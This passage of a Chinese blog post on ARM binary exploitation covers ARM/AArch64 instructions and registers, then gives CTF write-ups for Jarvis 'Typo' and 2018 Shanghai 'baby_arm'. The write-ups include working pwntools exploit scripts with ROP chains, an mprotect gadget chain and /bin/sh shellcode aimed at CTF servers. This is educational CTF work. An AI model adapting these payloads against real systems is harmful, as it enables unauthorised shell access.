<li><code>LDRH</code>：将一个16位的数据送到寄存器中，并且把高16位清零</li>
<li><code>STR</code>：从源寄存器32位存入到存储器中，和前几个指令相比是不清零</li>
</ol>
<h3 id="协处理器指令"><a href="#协处理器指令" class="headerlink" title="协处理器指令"></a>协处理器指令</h3><ol>
<li><code>CDP</code>：用于<code>ARM</code>处理器通知<code>ARM</code>协处理器来处理特定的操作，若协处理器不能完成，则抛出异常</li>
<li><code>LDC</code>：让协处理器来将源寄存器的内容送到存储器中，若协处理器不能完成操作，则抛出异常</li>
</ol>
<h3 id="异常产生指令"><a href="#异常产生指令" class="headerlink" title="异常产生指令"></a>异常产生指令</h3><ol>
<li><code>SWI</code>：产生软件中断</li>
<li><code>BKPT</code>：产生软件断点中断</li>
</ol>
<h2 id="7-AArch64架构"><a href="#7-AArch64架构" class="headerlink" title="7. AArch64架构"></a>7. AArch64架构</h2><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">寄存器名</th>
<th style="text-align:center">别名</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SP</td>
<td style="text-align:center">–</td>
<td style="text-align:center">Stack Pointer:栈指针</td>
</tr>
<tr>
<td style="text-align:center">R30</td>
<td style="text-align:center">LR</td>
<td style="text-align:center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td>
</tr>
<tr>
<td style="text-align:center">R29</td>
<td style="text-align:center">FP</td>
<td style="text-align:center">Frame Pointer:保存函数栈的基地址。</td>
</tr>
<tr>
<td style="text-align:center">R19-R28</td>
<td style="text-align:center">–</td>
<td style="text-align:center">Callee-saved registers（含义见上面术语解释）</td>
</tr>
<tr>
<td style="text-align:center">R18</td>
<td style="text-align:center">–</td>
<td style="text-align:center">平台寄存器，有特定平台解释其用法。</td>
</tr>
<tr>
<td style="text-align:center">R17</td>
<td style="text-align:center">IP1</td>
<td style="text-align:center">The second intra-procedure-call temporary register……</td>
</tr>
<tr>
<td style="text-align:center">R16</td>
<td style="text-align:center">IP0</td>
<td style="text-align:center">The first intra-procedure-call temporary register……</td>
</tr>
<tr>
<td style="text-align:center">R9-R15</td>
<td style="text-align:center">–</td>
<td style="text-align:center">临时寄存器</td>
</tr>
<tr>
<td style="text-align:center">R8</td>
<td style="text-align:center">–</td>
<td style="text-align:center">在一些情况下，返回值是通过R8返回的</td>
</tr>
<tr>
<td style="text-align:center">R0-R7</td>
<td style="text-align:center">–</td>
<td style="text-align:center">在函数调用过程中传递参数和返回值</td>
</tr>
<tr>
<td style="text-align:center">NZCV</td>
<td style="text-align:center">-</td>
<td style="text-align:center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td>
</tr>
</tbody>
</table>
</div>
<p> <strong>指令集变化</strong></p>
<ol>
<li>除了批量加载寄存器指令 LDM/STM, PUSH/POP, 使用STP/LDP 一对加载寄存器指令代替。</li>
<li>没有提供访问CPSR的单一寄存器，但是提供访问PSTATE的状态域寄存器。</li>
<li>A64没有协处理器的概念，没有协处理器指令MCR,MRC。</li>
<li>相比A32少了很多条件执行指令，只有条件跳转和少数数据处理这类指令才有条件执行。</li>
</ol>
<p><strong>内存操作指令-load/store</strong></p>
<p>在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。</p>
<p>在ARM-v8指令集中，程序支持以下五种寻址方式：</p>
<ol>
<li>Base register only (no offset) ：基址寄存器无偏移。形如:<code>[ base { , #0 } ]</code>。</li>
<li>Base plus offset：基址寄存器加偏移。形如:<code>[ base { , #imm } ]</code>。</li>
<li>Pre-indexed：事先更新寻址，先变化后操作。形如:<code>[ base , #imm ]!</code>。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</li>
<li>Post-indexed：事后更新寻址，先操作后变化。形如:<code>[ base ] , #imm</code>。</li>
<li>Literal (PC-relative): PC相对寻址。</li>
</ol>
<p>常见的Load/Store指令有：</p>
<p>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</p>
<p>⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)</p>
<p><code>LDR X1 , [X2]</code>——将X2寄存器中的值赋给X1寄存器。</p>
<p><code>LDR X1 , [X2] ， #4</code>——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。</p>
<h1 id="0x03-例题"><a href="#0x03-例题" class="headerlink" title="0x03 例题"></a>0x03 例题</h1><h2 id="Jarvis-Typo"><a href="#Jarvis-Typo" class="headerlink" title="Jarvis-Typo"></a>Jarvis-Typo</h2><p>无canary和PIE，静态链接</p>
<p>直接看padding</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//sh</span><br><span class="line">[~/桌面/ARM_PWN]$ qemu-arm -g 12345 -L /usr/arm-linux-gnueabi ./ARM1 </span><br><span class="line">//gdb</span><br><span class="line">pwndbg&gt; target remote localhost:12345</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164 </span><br><span class="line"></span><br><span class="line">//offset=112</span><br></pre></td></tr></table></figure>
<p>栈图如图所示</p>
<p><img src="/2021/04/29/arm-pwn/image-20210503224659166.png" alt="image-20210503224659166"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./babyheap",env =&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9888</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bin_sh = <span class="number">0x6c384</span></span><br><span class="line"><span class="comment">#0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line">gadget = <span class="number">0x00020904</span></span><br><span class="line">system = <span class="number">0x000110B4</span></span><br><span class="line">pld = <span class="string">b"A"</span>*offset + p32(gadget) + p32(bin_sh) + p32(<span class="number">0</span>) + p32(system)</span><br><span class="line">ru(<span class="string">"if you want to quit"</span>)</span><br><span class="line">sl(<span class="string">"\n"</span>)</span><br><span class="line">ru(<span class="string">"------Begin------"</span>)</span><br><span class="line">sla(<span class="string">"\n"</span>,pld)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h2 id="2018上海市baby-arm"><a href="#2018上海市baby-arm" class="headerlink" title="2018上海市baby_arm"></a>2018上海市baby_arm</h2><p>主函数</p>
<p>汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;main函数</span><br><span class="line">sub_400818</span><br><span class="line">var_s0&#x3D;  0</span><br><span class="line">&#x2F;&#x2F;X30下一条函数的地址，X29是函数栈基址</span><br><span class="line">STP             X29, X30, [SP,#-0x10]! &#x2F;&#x2F;将X29和X30写入SP和SP-0x08</span><br><span class="line">MOV             X29, SP &#x2F;&#x2F;调整FP</span><br><span class="line">BL              sub_400760 &#x2F;&#x2F;跳转0x400760</span><br><span class="line">ADRL            X0, 0x400900 	&#x2F;&#x2F;将Name读入X0</span><br><span class="line">MOV             X2, #5  ; n  &#x2F;&#x2F;读参数</span><br><span class="line">MOV             X1, X0  ; buf </span><br><span class="line">MOV             W0, #1  ; fd</span><br><span class="line">BL              .write</span><br><span class="line">ADRL            X0, 0x411068 &#x2F;&#x2F;读参数</span><br><span class="line">MOV             X2, #0x200 ; nbytes</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">BL              sub_4007F0</span><br><span class="line">MOV             W0, #0</span><br><span class="line">LDP             X29, X30, [SP],#0x10 &#x2F;&#x2F;出栈指令</span><br><span class="line">RET</span><br><span class="line">; End of function sub_400818</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;读取函数</span><br><span class="line">sub_4007F0</span><br><span class="line"></span><br><span class="line">var_50&#x3D; -0x50</span><br><span class="line"></span><br><span class="line">STP             X29, X30, [SP,#-0x50]! &#x2F;&#x2F;入栈指令</span><br><span class="line">MOV             X29, SP &#x2F;&#x2F;改变栈帧</span><br><span class="line">ADD             X0, X29, #0x10 &#x2F;&#x2F;X0传</span><br><span class="line">MOV             X2, #0x200 ; nbytes &#x2F;&#x2F;传参</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">NOP</span><br><span class="line">LDP             X29, X30, [SP],#0x50</span><br><span class="line">RET</span><br><span class="line">; End of function sub_4007F0</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Name:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  readstr_();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readstr_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>向bss段写入内容，然后有栈溢出</p>
</blockquote>
<p>基本思路：</p>
<ul>
<li>rop去mprotect改bss执行权限</li>
<li>执行bss段shellcode </li>
</ul>
<p>重要的是ARM的ROP</p>
<p>万能gadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_4008AC                            ; CODE XREF: sub_400868+60↓j</span><br><span class="line">                 LDR             X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器</span><br><span class="line">                 MOV             X2, X22    ;将x22寄存器的内容赋给x2</span><br><span class="line">                 MOV             X1, X23    ;将x23寄存器的内容赋给x1</span><br><span class="line">                 MOV             W0, W24    ;将W24寄存器的内容赋给W0</span><br><span class="line">                 ADD             X19, X19, #1    ;x19寄存器加一</span><br><span class="line">                 BLR             X3    ；跳转到x3寄存器指向的地址</span><br><span class="line">                 CMP             X19, X20    ；比较x19和x20是否相等</span><br><span class="line">                 B.NE            loc_4008AC    ；如果不相等，就跳回loc_4008AC继续执行</span><br><span class="line">loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">                 LDP             X19, X20, [SP,#0x10]    ;将sp+0x10,sp+0x18处的内容给x19,x20</span><br><span class="line">                 LDP             X21, X22, [SP,#0x20]    ;将sp+0x20,sp+0x28处的内容给x21,x22</span><br><span class="line">                 LDP             X23, X24, [SP,#0x30]    ;将sp+0x30,sp+0x38处的内容给x23,x24</span><br><span class="line">                 LDP             X29, X30, [SP],#0x40    ;将sp,sp+0x8处的内容给x29,x30</span><br><span class="line">                 RET</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gadget</p>
<p>4008CC可以控制x19,x20,x21,x22,x23,x24,x29,x30寄存器(<strong>存储返回地址</strong>)</p>
<p>4008AC可以控制w0,x1,x2,x3，也就是mprotect参数和mprotect地址。</p>
<p>所以我们只需要控制好堆栈，然后将shellcode的地址放到x30就可以。</p>
</blockquote>
<p>最终的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">binary = <span class="string">"./pwn"</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./babyheap",env =&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>, binary])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"12345"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>, binary])</span><br><span class="line">buf = asm(shellcraft.aarch64.sh())</span><br><span class="line">buf = buf.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">buf += p64(<span class="number">0x400600</span>)    <span class="comment">#这里是存放mprotect函数的地址</span></span><br><span class="line">padding  = cyclic(<span class="number">0x48</span>) </span><br><span class="line">payload  = padding + p64(<span class="number">0x4008CC</span>)       </span><br><span class="line">payload += p64(<span class="number">0</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line">payload += p64(<span class="number">0</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>      </span><br><span class="line"><span class="comment">#payload = cyclic(72) + flat([0x4008CC , 0 , 0x4008AC , 0 , 1 ,0x411168 , 5 , 0x1000 , 0x411000 , 0 , 0x411068] , [0xdeadbeef]*6)</span></span><br><span class="line">ru(<span class="string">"Name:"</span>)</span><br><span class="line">sl(buf)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/204913#h2-0" target="_blank" rel="noopener">ARM PWN 从 0 到 1 - 安全客，安全资讯平台 (anquanke.com)</a></li>
<li><a href="https://zszcr.github.io/2018/11/05/2018-11-5-[上海市大学生网络安全大赛]baby_arm复现/#baby-arm" target="_blank" rel="noopener">【上海市大学生网络安全大赛】pwn复现 - zs0zrc (zszcr.github.io)</a></li>
<li><a href="https://www.anquanke.com/post/id/199112" target="_blank" rel="noopener">ARM架构下的 Pwn 的一般解决思路 - 安全客，安全资讯平台 (anquanke.com)</a></li>
</ul>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="https://pz1o.top">pz1o</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="https://pz1o.top/2021/04/29/arm-pwn/">https://pz1o.top/2021/04/29/arm-pwn/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/PWN/">PWN</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2021/04/30/makefile/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">makefile</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2021/04/28/ORW/">
        <span class="next-text nav-default">ORW</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:pz1olzy@aliyun.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/pz1o" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2020 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">pz1o</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
